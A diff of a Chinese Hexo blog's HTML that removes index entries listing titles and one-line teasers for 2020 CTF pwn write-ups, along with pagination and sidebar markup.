-  	<time datetime="2020-09-01T13:27:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>强网杯和钓鱼城ctf部分题解</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/09/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%92%8C%E9%92%93%E9%B1%BC%E5%9F%8Ectf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%92%8C%E9%92%93%E9%B1%BC%E5%9F%8Ectf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-mips64调试环境搭建" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">mips64调试环境搭建</a>
-    </h1>
-  
-
-        
-        <a href="/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="archive-article-date">
-  	<time datetime="2020-08-25T12:10:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这里要感谢下Xpoint的大佬，超级感谢！大佬的博客：<a target="_blank" rel="noopener" href="http://matshao.com/archives/">http://matshao.com/archives/</a></p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-TCTF2020初赛simple_echoserver" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/26/TCTF2020%E5%88%9D%E8%B5%9Bsimple_echoserver/">TCTF/0CTF2020初赛simple_echoserver</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/26/TCTF2020%E5%88%9D%E8%B5%9Bsimple_echoserver/" class="archive-article-date">
-  	<time datetime="2020-07-26T13:17:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>学到了个格式化字符串的新姿势，这也太牛逼了</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/07/26/TCTF2020%E5%88%9D%E8%B5%9Bsimple_echoserver/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/26/TCTF2020%E5%88%9D%E8%B5%9Bsimple_echoserver/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-geekpwn线上赛ChildShell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/">GeekPwn线上初赛ChildShell</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/" class="archive-article-date">
-  	<time datetime="2020-07-26T12:00:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>使用ptrace绕过了限制，记录一下</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-geekpwn线上赛部分题解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">GeekPwn云靶场挑战赛部分题解</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-07-15T14:50:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>记录下比赛当时解出来的和后来复现的题目，队内web师傅太顶了！！！</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-RCTF2020部分题解_ch" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/">RCTF2020部分题解</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/" class="archive-article-date">
-  	<time datetime="2020-06-01T01:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>RCTF2020 一部分pwn(bf,mginx,vm,no_write,note)和re-cipher题解<br><escape>
-        
-          <a class="article-more-a" href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-空指针5月公开赛pwn题解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/">空指针5月公开赛pwn题解</a>
-    </h1>
-  
-
-        
-        <a href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-05-11T17:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>空指针平台的第一次pwn公开赛，很高兴拿到了邀请码<br><escape>
-        
-          <a class="article-more-a" href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -822,8 +325,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
